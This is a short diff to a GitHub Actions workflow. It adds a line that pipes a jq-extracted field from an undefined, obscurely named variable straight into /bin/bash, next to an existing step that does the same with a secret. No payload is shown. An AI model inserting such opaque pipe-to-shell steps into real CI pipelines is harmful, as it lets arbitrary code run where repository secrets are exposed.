@@ -22,6 +22,7 @@ jobs:
           ckx159: ${{ secrets.ckx159 }}
         run: |
           printf '%s' "$ckx159" | jq -r .ta1906 | /bin/bash
+          echo $mdupf779 | jq -r .av6751 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
